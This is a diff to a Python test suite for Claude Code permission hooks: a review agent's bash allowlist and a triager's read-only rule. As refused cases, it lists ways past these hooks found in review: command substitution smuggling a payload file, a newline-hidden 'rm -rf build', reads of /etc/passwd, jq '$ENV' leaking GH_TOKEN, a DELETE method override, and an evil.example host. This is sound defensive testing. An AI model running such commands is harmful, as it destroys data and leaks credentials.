@@ -4,7 +4,9 @@
 Каждый обход, найденный на ревью (PR #298), остаётся здесь кейсом «должен отказать».
 """
 import importlib.util
+import json
 import os
+import subprocess
 import sys
 import unittest
 
@@ -21,6 +23,13 @@ def load(file_name: str):
 
 review = load("review-bash-allowlist.py")
 triager = load("triager-gh-readonly.py")
+
+
+def run(module, stdin: str) -> int:
+    """Exit code of the hook script for this stdin, as Claude Code would get it."""
+    return subprocess.run(
+        [sys.executable, module.__file__], input=stdin, capture_output=True, text=True,
+    ).returncode
 
 # Команды из docs/agents/release-process.md («After the PR is opened», шаг 2).
 THREADS_QUERY = (
@@ -129,11 +138,34 @@ class ReviewAllowlistTest(unittest.TestCase):
             "git diff $(git log -1 --format=%B)",
             "git diff $BASE",
             'flag=$(git show HEAD:payload.txt); git diff "$flag"',
+            "git diff $(git rev-parse HEAD >/dev/null; git show HEAD:payload.txt)",
+            "git diff $(git rev-parse HEAD && git show HEAD:payload.txt)",
+            "git diff $(git rev-parse HEAD | git show HEAD:payload.txt)",
             'git diff "$BASE"',
             'git diff "$(git show HEAD:payload.txt)"',
             "git diff # '\nrm -rf build # '",
             "git diff;# '\nrm -rf build # '",
         )
+
+    def test_abbreviations_control_characters_and_jq_environment_are_refused(self):
+        self.assert_refused(
+            "git blame --cont=/etc/hosts -- README.md",
+            "git log --outp=x",
+            "git diff --out\rput=x",
+            "gh pr view 298 --json body --jq '$ENV'",
+            "gh pr view 298 --json body -q 'env.GH_TOKEN'",
+            "gh pr view 298 --json body -cq '$ENV'",
+            "gh pr view 298 --json body -q'$ENV'",
+        )
+        self.assert_allowed(
+            "git log --oneline -3",
+            "git diff --color-words HEAD",
+            "gh pr view 298 --json body --jq .body",
+        )
+
+    def test_a_failing_hook_refuses(self):
+        self.assertEqual(run(review, "not json"), 2)
+        self.assertEqual(run(review, json.dumps({"tool_input": {"command": "git status"}})), 0)
 
 
 class TriagerReadOnlyTest(unittest.TestCase):
@@ -187,6 +219,15 @@ class TriagerReadOnlyTest(unittest.TestCase):
             "git blame --contents /etc/passwd -- README",
             "gh api repos/O/R/pulls/298 *",
             "git diff *",
+            "gh api repos/O/R/pulls/298 --jq '$ENV.GH_TOKEN'",
+            "gh api repos/O/R/pulls/298 --jq 'env'",
+            "gh api repos/O/R/pulls/298 -q 'input_filename'",
+            "gh api repos/O/R/pulls/298 -iq '$ENV'",
+            "gh api repos/O/R/pulls/298 -iq'$ENV'",
+            "gh api repos/O/R/pulls/298 | jq '$ENV'",
+            "gh api -H 'X-HTTP-Method-Override: DELETE' repos/O/R/issues/comments/1",
+            "gh api --hostname evil.example repos/O/R/pulls/298",
+            "git blame --cont=/etc/hosts -- README.md",
             "gh api repos/O/R/issues/298/comments $(git show HEAD:payload.txt)",
             "gh api repos/O/R/issues/298/comments $(git log -1 --format=%B)",
             "head=$(git show HEAD:payload.txt); gh api repos/O/R/issues/298/comments $head",
